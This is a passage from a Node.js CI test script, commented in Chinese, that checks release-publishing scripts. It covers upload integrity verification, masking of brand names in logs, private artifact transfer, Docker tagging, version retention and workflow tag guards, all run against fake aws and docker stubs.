  const resetStore = () => rmSync(store, { recursive: true, force: true })

  // A. 截断上传(退出码 0)。这正是 2026-09-22 现场的形态。
  resetStore()
  const truncated = runPublish({ FAKE_AWS_TRUNCATE_BYTES: '10' })
  check(truncated.status !== 0, '上传被截断(远端 10 字节)时必须失败,不能静默写 latest.json')
  check(!existsSync(manifestPath), '完整性校验失败时**不得**写 latest.json(否则指针指向损坏对象)')
  check(
    `${truncated.stderr ?? ''}`.includes('校验失败'),
    `失败信息应点名完整性校验,实际: ${(truncated.stderr ?? '').slice(0, 200)}`,
  )

  // B. 远端大小与本地不一致(head-object 报错值)。
  resetStore()
  const wrongSize = runPublish({ FAKE_AWS_SIZE: '123' })
  check(wrongSize.status !== 0, '远端大小 != 本地大小时必须失败')
  check(!existsSync(manifestPath), '大小不符时不得写 latest.json')

  // C. 远端哈希与本地不一致(大小正确)。
  resetStore()
  const wrongSha = runPublish({ FAKE_AWS_SHA: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=' })
  check(wrongSha.status !== 0, '远端 SHA256 != 本地 SHA256 时必须失败')
  check(!existsSync(manifestPath), '哈希不符时不得写 latest.json')

  // D. 远端没有校验和 → 同样 fail-loud(不能退化成"只校大小")。
  resetStore()
  const noSha = runPublish({ FAKE_AWS_SHA: 'None' })
  check(noSha.status !== 0, '远端没有 SHA256 校验和时必须失败(不允许退化成只校大小)')
  check(!existsSync(manifestPath), '拿不到校验和时不得写 latest.json')

  // E. 正向对照:不注入故障 ⇒ 必须成功,否则上面四条可能只是"恒红"。
  resetStore()
  const ok = runPublish({})
  check(
    ok.status === 0,
    `完整上传 + 正确大小/校验和必须成功(否则上面几条恒红),实际退出 ${String(ok.status)}: ${(ok.stderr ?? '').slice(0, 300)}`,
  )
  check(existsSync(manifestPath), '正向对照应写出 latest.json')
  check(
    readFileSync(join(store, 'official', 'releases', '9.9.9', zipName), 'utf8') === content,
    '正向对照:远端对象应与本地字节一致',
  )
  // 上传必须是**单请求 PUT + 声明整对象 SHA256**:多段上传的校验和是"分片校验和的
  // 校验和",与本地 sha256 不可对拍(用它当判据会在每次正常发布上误报)。
  const putLine = readFileSync(log, 'utf8').split('\n')
    .find(line => line.includes('put-object') && line.includes(zipName))
  const expectedB64 = createHash('sha256').update(content).digest('base64')
  check(
    typeof putLine === 'string' && putLine.includes(`--checksum-sha256 ${expectedB64}`),
    `上传必须带 --checksum-sha256 <base64(本地 sha256)>,实际记录: ${putLine ?? '<无>'}`,
  )

  // 本地产物不自洽(SHA256SUMS 里没有该包的 sha256)→ 必须当场失败,不浪费一次上传。
  resetStore()
  writeFileSync(join(bundle, 'official', 'SHA256SUMS'), 'deadbeef  picoaide-server-9.9.9-amd64.zip\n')
  const badSums = runPublish({})
  check(badSums.status !== 0, '本地产物不自洽(SHA256SUMS 不含该包哈希)时必须失败')
  check(!existsSync(manifestPath), '本地产物不自洽时不得写 latest.json')

  // -------------------------------------------------------------------------
  // F–I. **按对象**的完整性回归网(2026-09-23 第六轮审计 R6-C-3)。
  //
  // 现场:A–E 五条注入全部打在**先被校验的那个 zip** 上,于是
  //   · 删掉 `ci-publish-update-server.sh:226`(SHA256SUMS 对象的 verify_remote_object),
  //   · 删掉 `:263`(清理旧版本之后、写 latest.json 之前的 zip 复检),
  // 两次 `node scripts/verify-ci-scripts.mjs` 都仍然 **EXIT=0**,而成功行照旧宣称
  // "上传后大小/哈希完整性校验"。指针对象(latest.json)当时更是完全没有校验。
  // 这四条用例就是那三处的判据面:注入**只作用于被点名的对象**。
  // -------------------------------------------------------------------------
  resetStore()
  writeFileSync(join(bundle, 'official', 'SHA256SUMS'),
    `${createHash('sha256').update(content).digest('hex')}  ${zipName}\n`)
  // F. `SHA256SUMS` 对象被截断(zip 完全正常)⇒ 必须失败,且不得写 latest.json。
  //    这是"客户拿它给包对拍、而它自己坏了"的现场形态。
  const sumsTruncated = runPublish({ FAKE_AWS_TRUNCATE_BYTES: '10', FAKE_AWS_TRUNCATE_KEY: 'SHA256SUMS' })
  check(sumsTruncated.status !== 0, 'SHA256SUMS 对象被截断(而 zip 正常)时必须失败')
  check(!existsSync(manifestPath), 'SHA256SUMS 完整性不过时不得写 latest.json')
  check(existsSync(join(store, 'official', 'releases', '9.9.9', zipName)),
    'F 用例的前提:zip 本身必须已完整上传(注入只作用于 SHA256SUMS)')
  // G. `SHA256SUMS` 对象哈希不符(大小正确)⇒ 同样必须失败。
  resetStore()
  const sumsWrongSha = runPublish({ FAKE_AWS_SHA: 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=', FAKE_AWS_SHA_KEY: 'SHA256SUMS' })
  check(sumsWrongSha.status !== 0, 'SHA256SUMS 对象的 SHA256 与本地不一致时必须失败')
  check(!existsSync(manifestPath), 'SHA256SUMS 哈希不符时不得写 latest.json')
  // H. **写指针前的复检**必须是拦住"上传后对象又坏了"的那条判据:
  //    第 1 次 zip head(上传后校验)读到的是好对象,之后对象被弄坏 ⇒ 只有复检能看见。
  resetStore()
  const staleAfterFirstCheck = runPublish({ FAKE_AWS_TRUNCATE_ON_HEAD: `${zipName}:1` })
  check(staleAfterFirstCheck.status !== 0,
    '上传后对象再被弄坏(第 1 次 head 之后截断)时,写指针前的复检必须失败 —— 删掉它会静默写出指向损坏对象的 latest.json')
  check(!existsSync(manifestPath), '写指针前的复检不过时不得写 latest.json')
  // I. **指针对象**本身也要校:latest.json 被截断 ⇒ 必须失败(客户更新链路的第一步就是读它)。
  resetStore()
  const pointerTruncated = runPublish({ FAKE_AWS_TRUNCATE_BYTES: '10', FAKE_AWS_TRUNCATE_KEY: 'latest.json' })
  check(pointerTruncated.status !== 0, 'latest.json 对象被截断时必须失败(指针损坏 = 客户更新链路不可用)')
  // 正向对照(与 E 同一形态,但注入面按对象收窄之后复跑一次):三条校验都该放行。
  resetStore()
  const scopedGreen = runPublish({ FAKE_AWS_TRUNCATE_KEY: 'nothing-matches', FAKE_AWS_SIZE_KEY: 'nothing-matches' })
  check(scopedGreen.status === 0,
    `带按对象作用域的注入但不命中任何对象时必须成功(否则 F–I 可能只是恒红),实际退出 ${String(scopedGreen.status)}: ${(scopedGreen.stderr ?? '').slice(0, 300)}`)
  check(existsSync(manifestPath), 'F–I 的正向对照应写出 latest.json')
  // 三个对象都确实被校验过:head-object 至少要各问到一次(证据,不是"存在性断言")。
  const scopedLog = readFileSync(log, 'utf8')
  for (const needle of [zipName, 'SHA256SUMS', 'latest.json']) {
    check(scopedLog.includes(`head-object official/releases/9.9.9/${needle}`)
      || scopedLog.includes(`head-object official/${needle}`),
    `正向对照:${needle} 必须被 head-object 校验过(缺了它 ⇒ 该对象的完整性判据不存在)`)
  }
}

// ---- 7. 品牌渠道产物私密中转(不经公开 artifact) ----
{
  const work = tempDir('ci-transfer-')
  const stage = join(work, 'client-assets')
  const out = join(work, 'release-artifacts')
  const list = join(work, 'channels.list')
  const store = join(work, 'store')
  const log = join(work, 'aws.log')
  writeFileSync(log, '')
  writeFileSync(list, 'official\nbeta\nexample-brand\n')

  // 渠道包:品牌串(slug/显示名)的真源。2026-09-11 泄漏事故里进公开日志的是
  // **由 slug 派生的产物文件名**,而当时只掩了渠道 id —— 所以夹具必须同时有
  // channel.json 与 slug 形态的文件名,否则这条回归测不出东西。
  mkdirSync(join(work, 'channels', 'example-brand'), { recursive: true })
  writeFileSync(join(work, 'channels', 'example-brand', 'channel.json'), JSON.stringify({
    schema: 1,
    channel_id: 'example-brand',
    identity: { display_name: 'Example Brand', short_name: 'Example' },
    desktop: { product_name: 'Example Brand', slug: 'Example-Brand' },
  }))
  const brandArtifact = 'Example-Brand-2.7.0-x64-Setup.exe'

  // 假 aws:recursive cp/rm 落到本地目录,并记录调用参数。
  const fakeAws = join(work, 'aws')
  writeFileSync(fakeAws, `#!/usr/bin/env bash
set -euo pipefail
log="${log}"
store="${store}"
record() { printf '%s\\n' "$*" >> "$log"; }
args=(); recursive=0
while [ $# -gt 0 ]; do
  case "$1" in
    --endpoint-url) shift 2 ;;
    --only-show-errors) shift ;;
    --recursive) recursive=1; shift ;;
    *) args+=("$1"); shift ;;
  esac
done
cmd="\${args[0]:-} \${args[1]:-}"
case "$cmd" in
  "s3 cp")
    src="\${args[2]}"; dst="\${args[3]}"
    record "cp $src $dst recursive=$recursive"
    # 真实 aws 失败时的形态(2026-09-11 泄漏来源):把源/目标对象键原样回显 ——
    # 目标键里就是由 slug 派生的文件名。
    if [ -n "\${FAKE_AWS_FAIL:-}" ]; then
      # 真实 aws 的失败信息回显的是**对象键**(目录上传时 = 前缀 + 文件名),
      # 而文件名由渠道包的 slug 派生 —— 这就是 2026-09-11 泄漏的原始形态。
      if [ "$recursive" = 1 ] && [[ "$src" != s3://* ]]; then
        first="$(ls "$src" 2>/dev/null | head -1)"
        echo "upload failed: $src/$first to \${dst}$first Unable to locate credentials" >&2
      else
        echo "upload failed: $src to $dst Unable to locate credentials" >&2
      fi
      exit 1
    fi
    if [ "$recursive" = 1 ]; then
      # 模拟真实 aws CLI 的前缀语义:s3 侧的路径就是**字面前缀**,尾斜杠即"目录"。
      # 刻意不特判 "/." —— 真实 CLI 不认它(当作字面前缀,匹配不到对象),
      # 桩要是把它"修正"了,就测不出那种路径形态的错误(2026-09-10 教训)。
      if [[ "$src" == s3://* ]]; then
        key="\${src#s3://*/}"; key="\${key%/}"
        mkdir -p "$dst"
        [ -d "$store/$key" ] && cp -a "$store/$key/." "$dst/"
      else
        key="\${dst#s3://*/}"; key="\${key%/}"
        mkdir -p "$store/$key"; cp -a "$src/." "$store/$key/"
      fi
    else
      key="\${dst#s3://*/}"
      mkdir -p "$(dirname "$store/$key")"; cp "$src" "$store/$key"
    fi
    ;;
  "s3 rm")
    prefix="\${args[2]}"; key="\${prefix#s3://*/}"
    record "rm $prefix"
    rm -rf "$store/$key"
    ;;
esac
`)
  execFileSync('chmod', ['+x', fakeAws])

  /** 跑一次中转脚本。 */
  const transfer = (mode, extra = [], env = {}) => spawnSync('bash', [transferScript, mode, '--list', list, ...extra], {
    cwd: work,
    encoding: 'utf8',
    env: {
      PATH: `${work}:${process.env.PATH ?? ''}`,
      HOME: process.env.HOME ?? '',
      GITHUB_RUN_ID: '4242',
      GITHUB_RUN_ATTEMPT: '1',
      ...env,
    },
  })
  // 两组凭据都要:aws CLI 只认 AWS_*(R2_* 是端点/桶名/HMAC 种子)。
  // 2026-09-11 v2.7.0 真实事故:夹具只给 R2_* 时脚本"本地全绿",正式 tag 上
  // 三个平台 job 全部以 aws 的 "Unable to locate credentials" 失败、品牌渠道零交付。
  const r2 = {
    R2_ACCOUNT_ID: 'acct',
    R2_BUCKET: 'bucket',
    R2_SECRET_ACCESS_KEY: 'secret',
    AWS_ACCESS_KEY_ID: 'keyid',
    AWS_SECRET_ACCESS_KEY: 'secret',
    AWS_DEFAULT_REGION: 'auto',
  }

  // 造三平台产物:官方/beta 留 artifact,品牌渠道必须被中转走并从暂存目录删除。
  for (const id of ['official', 'beta', 'example-brand']) {
    mkdirSync(join(stage, id), { recursive: true })
    // 品牌渠道的产物名由 slug 派生(与真实安装包一致:<slug>-2.7.0-x64-Setup.exe)。
    writeFileSync(join(stage, id, id === 'example-brand' ? brandArtifact : `App-${id}.AppImage`), 'x')
  }
  const pushed = transfer('push', ['--stage', stage], r2)
  check(pushed.status === 0, `品牌渠道中转 push 应成功,实际退出 ${String(pushed.status)}`)
  check(existsSync(join(stage, 'official')), '官方产物必须留在公开 artifact 暂存目录里')
  check(existsSync(join(stage, 'beta')), 'beta 产物必须留在公开 artifact 暂存目录里')
  check(!existsSync(join(stage, 'example-brand')), '品牌渠道产物必须从公开 artifact 暂存目录里删除')

  const transferLog = readFileSync(log, 'utf8')
  check((transferLog.match(/recursive=1/g) ?? []).length === 1, '只应中转品牌渠道(官方/beta 不上传)')
  // S3 路径形态(2026-09-10 教训):s3 侧必须是**标准前缀**(尾斜杠),
  // 不能写成 `prefix/.` —— 真实 aws CLI 当字面前缀处理,匹配不到任何对象,
  // 而桩会"好心"修正它,于是本地全绿、正式发布时才炸。这里把形态钉死。
  const pushCp = transferLog.split('\n').find(line => line.startsWith('cp ')) ?? ''
  check(/^cp \S+ s3:\/\/\S+\/ch-3\/ recursive=1$/u.test(pushCp), `中转上传应是"目录源 → 前缀/"形态,实际:${pushCp}`)
  check(!transferLog.includes('/.'), '中转命令里不得出现 prefix/. 形态(真实 CLI 匹配不到对象)')
  const keys = readdirSync(join(store, '_transfer')).sort()
  check(keys.length === 1 && !keys[0].includes('example-brand'), '中转前缀不得含渠道 id')
  check(keys[0].startsWith('4242-1-'), '中转前缀应按 run 派生')
  const token = keys[0].replace(/^4242-1-/, '')
  check(token.length === 16 && /^[0-9a-f]{16}$/u.test(token), '前缀 token 应是 HMAC 派生(不可猜测)')
  check(
    existsSync(join(store, '_transfer', keys[0], 'ch-3', brandArtifact)),
    '品牌渠道产物应落在 ch-<index> 目录(索引与渠道列表行号一致)',
  )

  // 公开日志(剔除 ::add-mask:: 指令行)里不得出现渠道名。
  const pushLines = `${pushed.stdout ?? ''}${pushed.stderr ?? ''}`
    .split('\n')
    .filter(line => !line.startsWith('::add-mask::'))
    .join('\n')
  check(!pushLines.includes('example-brand'), '中转的公开日志里不得出现渠道名')

  // 缺 R2 凭据 + 存在品牌渠道 → 必须失败(静默跳过 = 品牌渠道零交付)
  const noCreds = transfer('push', ['--stage', stage], { R2_ACCOUNT_ID: '', R2_BUCKET: '', R2_SECRET_ACCESS_KEY: '' })
  check(noCreds.status !== 0, '存在品牌渠道却没有 R2 凭据时必须失败')
  check((noCreds.stderr ?? '').includes('_transfer') || (noCreds.stderr ?? '').includes('不经过公开 artifact'),
    '失败信息应说明品牌渠道不经公开 artifact')

  // R2_* 齐了但 aws 凭据没给 → 同样必须 fail-loud,且要点名缺的是 AWS_*
  // (真实事故的报错是 aws 自己的 "Unable to locate credentials",指不到病根)
  const noAws = transfer('push', ['--stage', stage], {
    R2_ACCOUNT_ID: 'acct', R2_BUCKET: 'bucket', R2_SECRET_ACCESS_KEY: 'secret',
  })
  check(noAws.status !== 0, '存在品牌渠道却没有 aws 凭据时必须失败(不能只在真实发布时才炸)')
  check((noAws.stderr ?? '').includes('AWS_ACCESS_KEY_ID'), '失败信息应点名缺 AWS_ACCESS_KEY_ID')

  // 只有公开渠道时不依赖 R2
  const publicOnly = join(work, 'public.list')
  writeFileSync(publicOnly, 'official\nbeta\n')
  const publicRun = spawnSync('bash', [transferScript, 'push', '--list', publicOnly, '--stage', stage], {
    cwd: work,
    encoding: 'utf8',
    env: { PATH: `${work}:${process.env.PATH ?? ''}`, HOME: process.env.HOME ?? '' },
  })
  check(publicRun.status === 0, '只有官方/beta 时不应要求 R2 凭据')

  // pull:release job 取回自己的品牌产物
  const pulled = transfer('pull', ['--to', out], r2)
  check(pulled.status === 0, `品牌渠道中转 pull 应成功,实际退出 ${String(pulled.status)}`)
  check(existsSync(join(out, 'example-brand', brandArtifact)), 'pull 应把品牌产物还原到 release-artifacts/<channel>/')

  // 失败输出脱敏(2026-09-11 v2.7.0 真实泄漏):aws 的失败信息会回显对象键,
  // 而文件名由 slug 派生 —— 只掩渠道 id 掩不到它,于是客户品牌进了公开日志。
  mkdirSync(join(stage, 'example-brand'), { recursive: true })
  writeFileSync(join(stage, 'example-brand', brandArtifact), 'x')
  const failedPush = transfer('push', ['--stage', stage], { ...r2, FAKE_AWS_FAIL: '1' })
  const failedRaw = `${failedPush.stdout ?? ''}${failedPush.stderr ?? ''}`
  // 只看**公开日志**部分:剔掉 ::add-mask:: 指令行(GitHub 不展示其取值,
  // 与上面"公开日志里不得出现渠道名"的既有口径一致)。
  const failedOut = failedRaw.split('\n').filter(line => !line.startsWith('::add-mask::')).join('\n')
  check(failedPush.status !== 0, 'aws 失败时中转必须失败(不能静默丢产物)')
  // 前置条件:桩确实按真实 aws 的形态回显了对象键(否则后面的"不得出现品牌"
  // 会变成"因为压根没打印路径所以通过"的假绿)。
  check(/upload failed: \S+ to \S*\/\*\*\*/u.test(failedOut),
    '失败输出应保留 aws 的对象键形态、但把文件名脱敏成 ***')
  check(!failedOut.includes('Example-Brand'), '失败输出不得回显 slug 派生的文件名(客户品牌)')
  check(!failedOut.includes('example-brand'), '失败输出不得回显渠道 id')
  check(failedOut.includes('***'), '失败输出应把品牌串替换成 ***')
  check(failedRaw.includes('add-mask::Example-Brand'), 'slug 也必须登记进 GitHub 掩码')

  // clean:取回后立即销毁中转对象
  const cleaned = transfer('clean', [], r2)
  check(cleaned.status === 0, 'clean 应成功')
  check(!existsSync(join(store, '_transfer', keys[0], 'ch-3')), 'clean 必须删掉中转对象')
}

// ---- 8. 敏感路径不得入库(忽略规则是唯一防线,补一条硬守卫) ----
{
  const tracked = execFileSync('git', ['ls-files', '--full-name'], { cwd: root, encoding: 'utf8' })
    .split('\n')
    .filter(Boolean)
  for (const prefix of [
    'channels.list',
    'channels/',
    'channels-context/',
    'client-assets/',
    'release-artifacts/',
    'release-bundle/',
    'image.tar',
    'packages/host/desktop/build/channel.json',
    'packages/host/desktop/build/channel-electron-builder.cjs',
    'packages/host/desktop/e2e-results/',
  ]) {
    check(
      !tracked.some(file => (file === prefix || file.startsWith(prefix))
        && file !== 'channels/README.md'),
      `${prefix} 不得被 git 跟踪(渠道内容/打包产物只应留在本地,或经 R2 私密中转)`,
    )
  }
}

// ---- 9. 镜像装配:Linux 只放 AppImage、镜像双 tag、清单与产物中性 ----
{
  const work = tempDir('ci-images-')
  const list = join(work, 'channels.list')
  const artifacts = join(work, 'release-artifacts')
  const out = join(work, 'release-bundle')
  const log = join(work, 'docker.log')
  writeFileSync(log, '')
  writeFileSync(list, 'official\nbeta\n')
  for (const id of ['official', 'beta']) {
    mkdirSync(join(work, 'channels', id), { recursive: true })
    writeFileSync(join(work, 'channels', id, 'channel.json'), JSON.stringify({
      schema: 1, channel_id: id, identity: { display_name: `${id} AI`, short_name: id },
    }))
    // 三平台安装包:Linux 侧刻意同时给 AppImage 与 deb(镜像只该带走前者)
    mkdirSync(join(artifacts, id), { recursive: true })
    for (const name of ['App.AppImage', 'App.deb', 'App.dmg', 'App.exe']) {
      writeFileSync(join(artifacts, id, name), 'x')
    }
  }
  // 假 docker:只记录调用并按需造出 image.tar(镜像装配逻辑与 tag 形态是断言对象)
  const fakeDocker = join(work, 'docker')
  writeFileSync(fakeDocker, `#!/usr/bin/env bash
set -euo pipefail
printf '%s\\n' "$*" >> "${log}"
case "\${1:-}" in
  buildx) exit 0 ;;
  tag) exit 0 ;;
  save)
    prev=""
    for a in "$@"; do
      if [ "$prev" = "-o" ]; then : > "$a"; fi
      prev="$a"
    done
    exit 0 ;;
  run) exit 0 ;;
esac
exit 0
`)
  execFileSync('chmod', ['+x', fakeDocker])

  const run = spawnSync('bash', [
    imagesScript, '--list', list, '--artifacts', artifacts, '--out', out,
  ], {
    cwd: work,
    encoding: 'utf8',
    env: {
      PATH: `${work}:${process.env.PATH ?? ''}`,
      HOME: process.env.HOME ?? '',
      CI_IMAGE_BUILD_ROOT: work,
      VERSION: 'v9.9.9',
    },
  })
  check(run.status === 0, `镜像装配应成功,实际退出 ${String(run.status)}: ${(run.stderr ?? '').slice(0, 300)}`)

  const clientDir = join(work, 'client-assets', 'client')
  check(existsSync(join(clientDir, 'App.AppImage')), '镜像应带 Linux AppImage')
  check(!existsSync(join(clientDir, 'App.deb')), 'Linux deb 不得进镜像(已定案:镜像只放 AppImage)')
  const manifest = JSON.parse(readFileSync(join(work, 'client-assets', 'CLIENT-RELEASE.json'), 'utf8'))
  check(manifest.client.assets['linux-x64'].file.endsWith('.AppImage'), '清单 linux-x64 必须指向 AppImage')
  check(!JSON.stringify(manifest).includes('.deb'), '清单里不得出现 deb')
  check(manifest.channel_id === 'beta' || manifest.channel_id === 'official', '清单须声明本渠道')

  const dockerLog = readFileSync(log, 'utf8')
  check(
    dockerLog.includes('tag picoaide-harness-server:v9.9.9 picoaide-harness-server:9.9.9'),
    '镜像必须同时带 vX.Y.Z 与 X.Y.Z 两个 tag(部署文档与 latest.json 用的形式不同)',
  )
  check(
    /save .*picoaide-harness-server:v9\.9\.9 .*picoaide-harness-server:9\.9\.9/u.test(dockerLog),
    'docker save 必须带上两个 tag(否则 docker load 后少一个)',
  )
  // 渠道专属 tag(2026-09-23 审计 K-02):同一台宿主机上多个渠道栈时,归档内部的
  // `v<ver>` tag 完全相同,后 `docker load` 的会覆盖先前的 ⇒ 任一栈
  // `docker compose up -d server` 都可能用**另一渠道**的镜像重建(品牌/随包客户端
  // 全错,而 .env 里的 SERVER_IMAGE 看起来完全正确)。所以每个渠道的归档里必须
  // 额外带一个 `<channel>-<ver>` tag,部署侧才能把两栈彻底隔开。
  for (const channel of ['official', 'beta']) {
    check(
      dockerLog.includes(`tag picoaide-harness-server:v9.9.9 picoaide-harness-server:${channel}-9.9.9`),
      `镜像必须额外打渠道专属 tag ${channel}-<ver>(同机多栈时防止互相覆盖)`,
    )
    check(
      new RegExp(`save .*picoaide-harness-server:${channel}-9\\.9\\.9`, 'u').test(dockerLog),
      `docker save 必须带上渠道专属 tag ${channel}-<ver>(否则 docker load 后没有它)`,
    )
  }
  check(existsSync(join(out, 'official', 'picoaide-server-9.9.9-amd64.zip')), '产物名应中性(不含渠道 id)')
}

// ---- 10. 保留策略:本次刚发布的版本**永不**参与淘汰(2026-09-12 审计 P1-2) ----
//
// 旧实现把"远端已存在的全部版本目录"排序后从第 KEEP+1 位起删除,而 `$VER` 上一
// 步刚上传进这个集合 —— 于是它自己可能进待删集合;紧接着 latest.json 又把那个
// 已被删掉的路径写成下载地址 ⇒ 客户/运维拿到的 `server.version` 与 `image_asset`
// 指向 404,而流水线全绿。`sort -rV` 的语义(GNU version sort)让这件事在**正常
// 发布序列**下就会发生:预发布被视为比正式版"更大"(`2.7.2-beta.6` > `2.7.2`),
// 正式版一出就被自己的预发布挤到第 4 位。
{
  const work = tempDir('ci-prune-')
  const bundle = join(work, 'release-bundle')
  const store = join(work, 'store')
  const log = join(work, 'aws.log')
  const list = join(work, 'channels.list')
  writeFileSync(log, '')
  writeFileSync(list, 'beta\n')

  // 假 aws:与 §6 同一份(s3/s3api 同形,`s3 ls <对象键>` 命中时打印一行)。
  const fakeAws = join(work, 'aws')
  writeFileSync(fakeAws, fakeAwsScript({ store, log }))
  execFileSync('chmod', ['+x', fakeAws])

  /** 造出某渠道某版本的"已构建"资产,再跑一次发布。 */
  const publish = (channel, ver) => {
    mkdirSync(join(bundle, channel), { recursive: true })
    const content = `zip-${channel}-${ver}`
    const archive = `picoaide-server-${ver}-amd64.zip`
    writeFileSync(join(bundle, channel, archive), content)
    // SHA256SUMS 必须真的含该包哈希:发布脚本会先做本地产物自洽检查。
    writeFileSync(
      join(bundle, channel, 'SHA256SUMS'),
      `${createHash('sha256').update(content).digest('hex')}  ${archive}\n`,
    )
    const result = spawnSync('bash', [publishScript, '--list', list, '--bundle', bundle], {
      cwd: work,
      encoding: 'utf8',
      env: {
        PATH: `${work}:${process.env.PATH ?? ''}`,
        HOME: process.env.HOME ?? '',
        R2_ACCOUNT_ID: 'test-account',
        R2_BUCKET: 'test-bucket',
        VERSION: `v${ver}`,
      },
    })
    check(result.status === 0, `发布 v${ver} 应成功,实际退出 ${String(result.status)}: ${(result.stderr ?? '').slice(0, 200)}`)
    return result
  }
  const releasesDir = join(store, 'beta', 'releases')
  const published = ver => existsSync(join(releasesDir, ver, `picoaide-server-${ver}-amd64.zip`))

  // 场景 A(真实发布序列):beta 渠道目录里累积了预发布版,本次出**正式版** 2.7.2。
  // `sort -rV` 把 `2.7.2-beta.6` 排在 `2.7.2` 之前 ⇒ 旧实现里刚上传的 2.7.2
  // 落在第 4 位、被自己的保留策略删掉。
  for (const old of ['2.7.0', '2.7.1', '2.7.2-beta.4', '2.7.2-beta.5', '2.7.2-beta.6']) {
    mkdirSync(join(releasesDir, old), { recursive: true })
  }
  publish('beta', '2.7.2')
  check(published('2.7.2'), '本次刚发布的 2.7.2 绝不能被保留策略删掉(旧实现会:预发布排在正式版之前)')
  const afterA = readdirSync(releasesDir).sort()
  check(afterA.length === 3, `保留窗口应仍是 3 个版本($VER + 2 个次新),实际 ${afterA.length}: ${afterA.join(', ')}`)
  check(afterA.includes('2.7.2'), `保留窗口必须含本次版本,实际 ${afterA.join(', ')}`)
  // latest.json 的下载地址必须指向**真实存在**的资产(旧实现指向刚被删掉的目录)。
  const manifestA = JSON.parse(readFileSync(join(store, 'beta', 'latest.json'), 'utf8'))
  const prefixA = 'https://release.picoaide.com/beta/releases/'
  check(manifestA.server.version === '2.7.2', `latest.json 应声明本次版本,实际 ${String(manifestA.server.version)}`)
  check(manifestA.server.image_asset.startsWith(prefixA), `latest.json 的地址应在本渠道目录下,实际 ${manifestA.server.image_asset}`)
  const relativeA = manifestA.server.image_asset.slice(prefixA.length)
  check(
    existsSync(join(store, 'beta', 'releases', relativeA)) || existsSync(join(releasesDir, relativeA)),
    `latest.json 指向的资产必须真实存在(否则客户取包 404): ${relativeA}`,
  )

  // 场景 B(补发/回滚旧版本):远端已有比本次更新的版本,旧实现会把刚上传的旧版本删掉。
  for (const old of ['2.7.0', '2.7.1', '2.7.2', '2.7.3']) {
    mkdirSync(join(releasesDir, old), { recursive: true })
  }
  publish('beta', '2.7.0')
  check(published('2.7.0'), '补发旧版本时,本次刚上传的 2.7.0 也不能被删')
  const afterB = readdirSync(releasesDir).sort()
  check(afterB.length === 3, `保留窗口应仍是 3 个版本,实际 ${afterB.length}: ${afterB.join(', ')}`)
  check(afterB.includes('2.7.0'), `保留窗口必须含本次版本,实际 ${afterB.join(', ')}`)
}

// ---- 11. 品牌渠道产物不得进入**无 tag 守卫**的公开 artifact(2026-09-12 审计 P1-1) ----
//
// artifact 对任何登录账号可下载(公开仓尤其匿名可读),所以"品牌渠道产物不进公开
// artifact"是定策;唯一把品牌目录搬出 `client-assets/` 的 transfer step 带
// `startsWith(github.ref, 'refs/tags/v')` 守卫 ⇒ **分支/PR 上它被跳过**。
// 于是同一轮里 `upload-artifact` 成了唯一出口:它自己必须带同源守卫,且非 tag 时
// 只上传 official。这条只能静态检查(本地跑不了 GitHub Actions),所以放在这里。
{
  const workflowPath = join(root, '.github', 'workflows', 'ci.yml')
  const text = readFileSync(workflowPath, 'utf8')
  const lines = text.split(/\r?\n/u)
  // 手写扫描而不是引 YAML 依赖:根脚本只用 Node 内建模块(与 check-workflows.mjs
  // 同口径)。只认 `steps:` 下的 step(`      - `),键收在缩进 8–12(`if:` 在 8,
  // `with:` 的 `name:`/`path:` 在 10);最后一个同名键生效。
  const jobs = new Map()
  let jobId
  let inSteps = false
  let step
  for (let index = 0; index < lines.length; index += 1) {
    const line = lines[index]
    const job = /^ {2}([A-Za-z0-9_-]+):\s*$/u.exec(line)
    if (job !== null) {
      jobId = job[1]
      inSteps = false
      step = undefined
      jobs.set(jobId, [])
      continue
    }
    if (jobId === undefined) continue
    // job 级的键(`    runs-on:` / `    if:` …):只有 `    steps:` 之后才是 step 序列。
    if (/^ {4}[A-Za-z_][\w-]*:/u.test(line)) {
      inSteps = /^ {4}steps:\s*$/u.test(line)
      step = undefined
      continue
    }
    if (!inSteps) continue
    if (/^ {6}- /u.test(line)) {
      step = { line: index + 1, keys: new Map() }
      jobs.get(jobId).push(step)
      // `      - uses: …` 这种把键写在序列项同一行的形态。
      const inline = /^ {6}- ([A-Za-z_][\w-]*):\s*(.*)$/u.exec(line)
      if (inline !== null) step.keys.set(inline[1], inline[2])
    }
    if (step === undefined) continue
    const key = /^ {8,12}([A-Za-z_][\w-]*):\s*(.*)$/u.exec(line)
    if (key !== null) step.keys.set(key[1], key[2])
  }

  const tagGuarded = condition => condition.includes("startsWith(github.ref, 'refs/tags/v')")
  const uploads = []
  for (const [id, steps] of jobs) {
    for (const candidate of steps) {
      if (!(candidate.keys.get('uses') ?? '').startsWith('actions/upload-artifact')) continue
      uploads.push({
        job: id,
        line: candidate.line,
        path: candidate.keys.get('path') ?? '',
        condition: candidate.keys.get('if') ?? '',
      })
    }
  }
  check(uploads.length >= 4, `未解析出 ci.yml 的 artifact 上传步骤(扫描器可能已失效),实际 ${uploads.length}`)

  // 上传整份 client-assets/** 的步骤必须带 tag 守卫:非 tag 上传的只能是 official。
  const brandFacing = uploads.filter(upload => upload.path.includes('client-assets/'))
  check(brandFacing.length >= 3, `未解析出 client-assets 的 artifact 上传步骤(三个平台各一条),实际 ${brandFacing.length}`)
  for (const upload of brandFacing) {
    const officialOnly = upload.path.startsWith('client-assets/official/')
    check(
      officialOnly || tagGuarded(upload.condition),
      `ci.yml:${upload.line} (job ${upload.job}) 把 client-assets/** 传进公开 artifact 却没有 tag 守卫`
        + `(非 tag 时品牌渠道产物还在目录里 ⇒ 客户身份泄漏;if: ${upload.condition || '<无>'})`,
    )
    if (officialOnly) {
      check(
        upload.condition.includes('!startsWith(github.ref'),
        `ci.yml:${upload.line} (job ${upload.job}) 只传 official 的 fallback 必须在**非 tag** 时生效(if: ${upload.condition || '<无>'})`,
      )
    }
  }
  // 三个平台各自都要有"tag 传全量 / 非 tag 传 official"这一对,缺一个平台就是一条泄漏面。
  for (const artifact of ['desktop-Linux', 'desktop-Windows-installer']) {
    const names = []
    for (const [id, steps] of jobs) {
      for (const candidate of steps) {
        if (candidate.keys.get('name') === artifact) names.push({ job: id, keys: candidate.keys })
      }
    }
    check(names.length >= 2, `${artifact} 应有 tag/非 tag 两个上传步骤(否则非 tag 上没有可下载产物),实际 ${names.length}`)
    const guarded = names.filter(entry => tagGuarded(entry.keys.get('if') ?? ''))
